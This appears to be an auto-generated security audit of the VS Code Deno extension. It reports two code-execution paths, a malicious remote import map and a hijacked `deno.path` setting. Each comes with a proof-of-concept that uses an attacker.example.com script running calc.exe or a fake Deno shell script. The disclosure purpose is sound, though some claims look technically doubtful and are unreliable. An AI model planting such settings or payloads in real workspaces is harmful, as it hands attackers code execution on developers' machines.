### Vulnerability: Remote Code Execution via Malicious Import Map

**Description:**
1. An attacker crafts a malicious import map JSON file and hosts it at a publicly accessible URL (e.g., `http://attacker.example.com/malicious_import_map.json`). This import map redirects legitimate module specifiers to attacker-controlled scripts.
2. The attacker uses social engineering, phishing, or other methods to trick a user of the VS Code Deno extension into configuring the `deno.importMap` setting in their VS Code workspace or user settings. The user is instructed to set the value of `deno.importMap` to the URL of the attacker's malicious import map (e.g., `http://attacker.example.com/malicious_import_map.json`).
3. The user opens or creates a Deno project in Visual Studio Code with the Deno extension enabled for the workspace.
4. When the VS Code Deno extension initializes or performs operations that involve module resolution (such as type checking, linting, or code completion), it retrieves and utilizes the import map specified in the `deno.importMap` setting.
5. Due to the malicious import map configuration, when the extension attempts to resolve modules, it might inadvertently load and execute scripts from URLs controlled by the attacker, as defined in the import map's redirection rules.
6. This leads to the execution of arbitrary code within the context of the user's Visual Studio Code environment, specifically within the Deno runtime environment managed by the extension.

**Impact:**
Successful exploitation of this vulnerability allows the attacker to achieve remote code execution on the user's machine. The attacker can execute arbitrary code with the same privileges as the Visual Studio Code process. This can lead to severe consequences, including:
- Data theft: Access to sensitive files, credentials, and project data within the user's workspace.
- System compromise: Potential to install malware, create persistent backdoors, or pivot to other systems on the network.
- Supply chain attacks: If the compromised workspace is part of a larger development pipeline, the attacker could inject malicious code into projects, affecting downstream users and systems.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:**
There are no explicit mitigations visible in the provided project files that directly address the risk of malicious import map usage. The extension currently trusts the user-provided URL for the import map without performing any validation or security checks on the content or source of the import map.

**Missing Mitigations:**
- Input Validation and Sanitization: The extension should implement validation for the `deno.importMap` setting. This could include:
    - Warning users explicitly about the risks of using remote import maps, especially when the source is untrusted.
    - Suggesting or enforcing the use of local import maps instead of remote URLs whenever possible.
    - Potentially implementing checks to verify the content type and basic structure of the import map file before using it.
- Security Warnings and User Education: Improve documentation to strongly emphasize the security implications of using untrusted import maps. Provide best practices for securely managing and configuring import maps.

**Preconditions:**
- The VS Code Deno extension must be installed and enabled in Visual Studio Code.
- The user must have Deno CLI installed and configured for use with the extension.
- The attacker must successfully trick the user into manually setting the `deno.importMap` configuration setting to a malicious URL.

**Source Code Analysis:**
- `README.md`: The `README.md` file documents the `deno.importMap` configuration setting under the "Configuration" section, explaining its purpose and usage, but it does not mention any security considerations or warnings related to using untrusted import map URLs.
- `client/src/commands.ts`: This file contains the `startLanguageServer` function, which is responsible for initiating the Deno Language Server. Within this function, the configuration settings for the extension, including `deno.importMap`, are read from VS Code's workspace configuration and passed as initialization options to the Language Server. However, there is no visible code that validates or sanitizes the `deno.importMap` value before it is used.
- `client/src/extension.ts`: This file sets up the Language Client and defines `clientOptions`, which include passing the configuration settings to the Language Server. Similar to `commands.ts`, no input validation or security checks are implemented for the `deno.importMap` setting within this file.
- `client/src/types.d.ts`: This file defines the TypeScript interfaces and types used within the extension, including `DenoExtensionContext` and `EnableSettings`. These type definitions do not include any security logic or validation mechanisms for configuration settings.

**Conclusion from Source Code Analysis:**
The source code analysis indicates that the extension currently lacks input validation and security checks for the `deno.importMap` setting. The extension reads the configuration value and passes it to the Deno Language Server without any explicit security considerations. This absence of validation makes the extension vulnerable to the malicious import map attack vector.

**Security Test Case:**
1. **Attacker Setup:**
    - Create a malicious import map file named `malicious_import_map.json` with the following content:
      ```json
      {
        "imports": {
          "benign_module": "http://attacker.example.com/malicious_script.js"
        }
      }
      ```
    - Create a malicious JavaScript file named `malicious_script.js` with the following content (this example is for demonstration and harmless, replace `calc.exe` with a more impactful payload for real testing in a controlled environment):
      ```javascript
      const process = require('child_process');
      process.execSync('calc.exe'); // Opens calculator on Windows as an example of RCE
      console.log("Malicious script from import map executed!");
      ```
    - Host both `malicious_import_map.json` and `malicious_script.js` on an attacker-controlled web server, making them accessible via `http://attacker.example.com/malicious_import_map.json` and `http://attacker.example.com/malicious_script.js` respectively.
2. **Victim Configuration:**
    - Open Visual Studio Code and install the Deno extension if not already installed.
    - Create a new workspace or open an existing one.
    - In VS Code settings (workspace or user settings), set the `deno.importMap` setting to `http://attacker.example.com/malicious_import_map.json`.
3. **Victim Project Setup:**
    - Create a new Deno file (e.g., `test_module.ts`) within the workspace with the following code:
      ```typescript
      import * as benignModule from "benign_module";

      console.log("Loading benign module...");
      ```
4. **Trigger Vulnerability:**
    - Open the `test_module.ts` file in the editor.
    - Observe the behavior.

**Expected Result:**
When `test_module.ts` is opened and processed by the Deno extension, the following should occur:
- The calculator application (`calc.exe` on Windows) should launch, indicating arbitrary code execution.
- The "Malicious script from import map executed!" message should be visible in the console output (if the malicious script includes console logging).
- The "Loading benign module..." message from `test_module.ts` might or might not be logged depending on the execution flow and if the malicious script interrupts further execution.

**Success Condition:**
The successful execution of the calculator application (or equivalent payload in `malicious_script.js`) confirms the Remote Code Execution vulnerability via a malicious import map. This test demonstrates that the extension loads and processes the import map from the attacker-controlled URL, leading to the execution of malicious code when modules are resolved.

### Vulnerability: Malicious `deno.path` Configuration

**Description:**
1. An attacker crafts a malicious VS Code workspace.
2. Within this workspace, the attacker creates a `.vscode/settings.json` file.
3. In this settings file, the attacker sets the `deno.path` configuration to point to a malicious executable file located within the workspace or an attacker-controlled external location. This malicious executable is designed to mimic the Deno CLI but contains harmful code.
4. The victim opens this malicious workspace in VS Code with the Deno extension enabled.
5. When the Deno extension starts, it reads the `deno.path` setting from the workspace configuration.
6. The extension, without proper validation, uses the attacker-specified path to execute what it believes is the Deno CLI, but is actually the malicious executable.
7. The malicious executable runs with the privileges of the user running VS Code, allowing the attacker to execute arbitrary code on the victim's machine.

**Impact:** Arbitrary code execution on the user's machine. An attacker can gain full control over the user's development environment, potentially leading to data theft, malware installation, or further system compromise.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:** None. The extension currently retrieves and uses the `deno.path` setting without any validation to ensure it points to a legitimate and safe Deno executable.

**Missing Mitigations:**
- Input validation for the `deno.path` setting: The extension should validate that the provided path points to a legitimate Deno executable. This could involve checking file signatures, verifying the executable's origin, or using a safelist of known good paths.
- User warning: When the `deno.path` setting is changed, especially to a location within the workspace or an external potentially untrusted path, the extension should display a prominent warning to the user. This warning should highlight the security risks associated with using custom executable paths and advise users to only use trusted Deno executables.

**Preconditions:**
- The victim has the Deno extension for VS Code installed and enabled.
- The victim opens a malicious VS Code workspace provided by the attacker.

**Source Code Analysis:**
1. `client\src\commands.ts`:
    - The `startLanguageServer` function is responsible for initiating the Deno Language Server.
    - It calls `getDenoCommandPath()` to determine the path to the Deno executable.
    ```typescript
    const command = await getDenoCommandPath();
    if (command == null) {
      // ... error handling ...
      return;
    }
    ```
2. `client\src\util.ts`:
    - The `getDenoCommandPath()` function retrieves the `deno.path` configuration from VS Code settings.
    ```typescript
    function getWorkspaceConfigDenoExePath() {
      const exePath = workspace.getConfiguration(EXTENSION_NS)
        .get<string>("path");
      // ...
      return exePath;
    }
    ```
    - It prioritizes the `deno.path` setting over the default `deno` command lookup.
    ```typescript
    export async function getDenoCommandPath() {
      const command = getWorkspaceConfigDenoExePath();
      const workspaceFolders = workspace.workspaceFolders;
      if (!command || !workspaceFolders) {
        return command ?? await getDefaultDenoCommand();
      } // ...
    }
    ```
    - The code does not perform any validation on the `command` path to verify it is a legitimate Deno executable or from a trusted source. It merely checks if the file exists.

**Visualization:**
```mermaid
graph LR
    A[User opens malicious workspace] --> B(Extension activation);
    B --> C{Read deno.path from settings};
    C --> D[getDenoCommandPath() in util.ts];
    D --> E{getConfiguration(EXTENSION_NS).get("path")};
    E --> F[No validation of path];
    F --> G[Execute command as Language Server];
    G --> H[Malicious code execution];
```

**Security Test Case:**
1. **Setup Malicious Executable:**
    - Create a file named `malicious-deno.sh` (or `malicious-deno.bat` on Windows) with the following content:
        ```bash
        #!/bin/bash
        echo "Malicious Deno Executable Running!" > /tmp/malicious_execution.txt
        # On Windows, use: echo "Malicious Deno Executable Running!" > %TEMP%\malicious_execution.txt
        ```
    - Make the script executable: `chmod +x malicious-deno.sh`
    - Place this script in a known location, for example, within your testing workspace.
2. **Create Malicious Workspace:**
    - Create a new VS Code workspace directory.
    - Inside the workspace, create a `.vscode` folder.
    - Within `.vscode`, create a `settings.json` file with the following content, adjusting the path to the malicious script:
        ```json
        {
            "deno.enable": true,
            "deno.path": "/path/to/your/workspace/malicious-deno.sh"
            // On Windows, use: "deno.path": "C:\\path\\to\\your\\workspace\\malicious-deno.bat"
        }
        ```
        - **Important:** Replace `/path/to/your/workspace/malicious-deno.sh` with the actual absolute path to the `malicious-deno.sh` file you created. Ensure to use forward slashes even on Windows in JSON.
3. **Open Workspace in VS Code:**
    - Open the workspace you created in VS Code with the Deno extension enabled.
4. **Observe Malicious Execution:**
    - Check for the file `/tmp/malicious_execution.txt` (or `%TEMP%\malicious_execution.txt` on Windows). If it exists and contains "Malicious Deno Executable Running!", the vulnerability is confirmed. This indicates that the malicious script specified in `deno.path` was executed by the extension.
